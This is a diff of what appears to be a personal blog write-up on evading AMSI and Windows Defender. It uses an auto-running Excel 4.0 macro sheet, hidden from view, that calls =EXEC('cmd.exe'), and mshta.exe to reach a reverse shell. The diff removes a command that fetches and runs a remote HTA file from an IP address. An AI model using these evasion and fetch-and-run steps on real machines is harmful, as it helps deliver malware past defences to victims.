@@ -23,18 +23,13 @@ So i began researching AMSI as i never heard of it. The following resources brea
 
 The first two explain what AMSI is and the last two go into the easier ways to bypass it. Security-Soup broke down how some actors bypassed it using excel 4.0 macros.
 Aka really old macros that still work. I used the following link to get more familiar with these macros.[Excel Off The Grid](https://exceloffthegrid.com/using-excel-4-macro-functions/).
-I pretty much right clicked my sheet. And clicked Excel 4.0 macro. This creates a new sheet called macro1. If you rename the first cell Auto_open it will run the sheet cell by cell.
-You can run pretty much anything with the following function.
+I pretty much right clicked my sheet. And clicked Excel 4.0 macro. This creates a new sheet called macro1. If you rename the first cell Auto_open it will run the sheet cell by cell. Dont forget to hide the sheet after this lol. You can run pretty much anything with the following function.
 ```
 =EXEC("cmd.exe")
 ```
 The issue i was running into at this point was not AMSI it was defender flagging certain lolbins like certil for example.
 So i decide to look for lolbins that could potentially bypass defender since AMSI was taken care of. I came across a post here on [IronHackers](https://ironhackers.es/en/cheatsheet/comandos-en-windows-para-obtener-shell/)
-That pretty much goes through alot of lolbins but what i noticed was they mentioned that.
-```
-mshta.exe http://192.168.43.103/Launcher.hta
-```
-Mshta.exe doesnt get flagged.
+That pretty much goes through alot of lolbins but what i noticed was they mentioned that. Mshta.exe doesnt get flagged.
 
 
 
@@ -98,5 +93,9 @@ Im not very savy to Jscript or VB so i found this online entered my own powershe
 And to my surprise it did not trigger defender and my reverse shell came in soon after. So with just using an old school method found with soome googling and leveraging mshta.exe you too can bypass defender as well as AMSI to get code execution.
 
 
-## How to bypass AMSI (The Harder Way, But Also More Flexible)
-[Hoang Bui's Blog](https://medium.com/@fsx30/excel-4-0-macro-old-but-new-967071106be9)
+## How to bypass AMSI (The Harder Way)
+### but its more flexible and in depth
+===> [Hoang Bui's Blog](https://medium.com/@fsx30/excel-4-0-macro-old-but-new-967071106be9)
+
+## Coming soon
+### MacOS phishing tactics
